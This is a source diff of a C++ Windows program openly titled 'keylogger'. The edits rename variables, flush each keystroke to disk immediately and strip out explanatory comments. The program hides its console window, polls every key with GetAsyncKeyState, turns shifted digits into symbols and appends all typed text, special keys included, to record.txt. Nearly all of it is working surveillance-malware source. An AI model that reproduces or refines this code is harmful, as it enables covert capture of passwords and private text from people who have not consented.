@@ -1,7 +1,7 @@
 /*######################################################################################
 # Dev: cnd.dev
 # Program Name: keylogger
-# Version: 1.0.0
+# Version: 1.0.0.1
 #  - Major.Minor.Update/BuildNumber
 # Date: 201528OCT25
 # Filename: keylogger.cpp
@@ -19,10 +19,10 @@
 using namespace std;
 
 void hideWindow() {
-	HWND hidden;
+	HWND hiddenWindow;
 	AllocConsole();
-	hidden = FindWindowA("ConsoleWindowClass", NULL);
-	ShowWindow(hidden, 0);
+	hiddenWindow = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(hiddenWindow, 0);
 }
 
 void logging() {
@@ -34,122 +34,122 @@ void logging() {
 			// if key is pressed (from up to down)
 			if (GetAsyncKeyState(key) == -32767) {
 				//ios::app opens the file in append mode
-				ofstream write("record.txt", ios::app);
+				ofstream fileObject("record.txt", ios::app);
 
 				//if shift key (left or right) is pressed AND uppercase A-Z is pressed, then capture the lowercase equivalent
 				if ((key >= 65 && key <= 90) && !(GetAsyncKeyState(0x10))) {
 					key += 32;   // change upper to lowercase
-					write << key;
-					write.close();
+					fileObject << key;
+					fileObject.flush();   //save every keystroke immediately
 					break;
 				}
 
 				//if no shift key is pressed, then capture uppercase
 				else if (key >= 65 && key <= 90) {
-					write << key;
-					write.close();
+					fileObject << key;
+					fileObject.flush();  //save every keystroke immediately
 					break;
 				}
 
 				//
 				else {
 					switch (key) {
-						case 48: {
-							if (GetAsyncKeyState(0x10))
-								write << ")";
-							else
-								write << "0";
-							break;
-						}
-						case 49: {
-							if (GetAsyncKeyState(0x10))
-								write << "!";
-							else
-								write << "1";
-							break;
-						}
-						case 50: {
-							if (GetAsyncKeyState(0x10))
-								write << "@";
-							else
-								write << "2";
-							break;
-						}
-						case 51: {
-							if (GetAsyncKeyState(0x10))
-								write << "#";
-							else
-								write << "3";
-							break;
-						}
-						case 52: {
-							if (GetAsyncKeyState(0x10))
-								write << "$";
-							else
-								write << "4";
-							break;
-						}
-						case 53: {
-							if (GetAsyncKeyState(0x10))
-								write << "%";
-							else
-								write << "5";
-							break;
-						}
-						case 54: {
-							if (GetAsyncKeyState(0x10))
-								write << "^";
-							else
-								write << "6";
-							break;
-						}
-						case 55: {
-							if (GetAsyncKeyState(0x10))
-								write << "&";
-							else
-								write << "7";
-							break;
-						}
-						case 56: {
-							if (GetAsyncKeyState(0x10))
-								write << "*";
-							else
-								write << "8";
-							break;
-						}
-						case 57: {
-							if (GetAsyncKeyState(0x10))
-								write << "(";
-							else
-								write << "9";
-							break;
-						}
+					case 48: {
+						if (GetAsyncKeyState(0x10))
+							fileObject << ")";
+						else
+							fileObject << "0";
+						break;
+					}
+					case 49: {
+						if (GetAsyncKeyState(0x10))
+							fileObject << "!";
+						else
+							fileObject << "1";
+						break;
+					}
+					case 50: {
+						if (GetAsyncKeyState(0x10))
+							fileObject << "@";
+						else
+							fileObject << "2";
+						break;
+					}
+					case 51: {
+						if (GetAsyncKeyState(0x10))
+							fileObject << "#";
+						else
+							fileObject << "3";
+						break;
+					}
+					case 52: {
+						if (GetAsyncKeyState(0x10))
+							fileObject << "$";
+						else
+							fileObject << "4";
+						break;
+					}
+					case 53: {
+						if (GetAsyncKeyState(0x10))
+							fileObject << "%";
+						else
+							fileObject << "5";
+						break;
+					}
+					case 54: {
+						if (GetAsyncKeyState(0x10))
+							fileObject << "^";
+						else
+							fileObject << "6";
+						break;
+					}
+					case 55: {
+						if (GetAsyncKeyState(0x10))
+							fileObject << "&";
+						else
+							fileObject << "7";
+						break;
+					}
+					case 56: {
+						if (GetAsyncKeyState(0x10))
+							fileObject << "*";
+						else
+							fileObject << "8";
+						break;
+					}
+					case 57: {
+						if (GetAsyncKeyState(0x10))
+							fileObject << "(";
+						else
+							fileObject << "9";
+						break;
+					}
 
-						//VIRTUAL KEYS NAMED CONSTANTS IN WINDOWS API (windows.h/winuser.h)
-						case VK_SPACE: {
-							write << " ";
-							break;
-						}
-						case VK_RETURN: {
-							write << "\n";
-							break;
-						}
-						case VK_TAB: {
-							write << "	";
-							break;
-						}
-						case VK_BACK: {
-							write << "[BACKSPACE]";
-							break;
-						}
-						case VK_ESCAPE: {
-							write << "[ESC]";
-							break;
-						}
-						case VK_DELETE: {
-							write << "[DELETE]";
-							break;
-						}
+						   //VIRTUAL KEYS NAMED CONSTANTS IN WINDOWS API (windows.h/winuser.h)
+					case VK_SPACE: {
+						fileObject << " ";
+						break;
+					}
+					case VK_RETURN: {
+						fileObject << "\n";
+						break;
+					}
+					case VK_TAB: {
+						fileObject << "	";
+						break;
+					}
+					case VK_BACK: {
+						fileObject << "[BACKSPACE]";
+						break;
+					}
+					case VK_ESCAPE: {
+						fileObject << "[ESC]";
+						break;
+					}
+					case VK_DELETE: {
+						fileObject << "[DELETE]";
+						break;
+					}
 					}
 				}
 			}
@@ -163,19 +163,3 @@ int main()
 	logging();
 	return 0;
 }
-
-//sleep(0); 
-//pauses the program briefly to prevent it from using 100% CPU
-//0 (milliseconds) tells the program to stop using the CPU whenever another program wants to use it
-
-
-// GetAsyncKeyState is a Windows API function that checks the state of a virtual key.
-// It returns a short (16-bit) value:
-//   - The most significant bit (0x8000) is set if the key is currently down.
-//   - The least significant bit (0x0001) is set if the key was pressed since the last call.
-// If the return value is -32767 (0x8001), it means the key was just pressed (transitioned from up to down).
-// This helps prevent repeated logging when a key is held down; it logs only on the initial press.
-
-
-
-
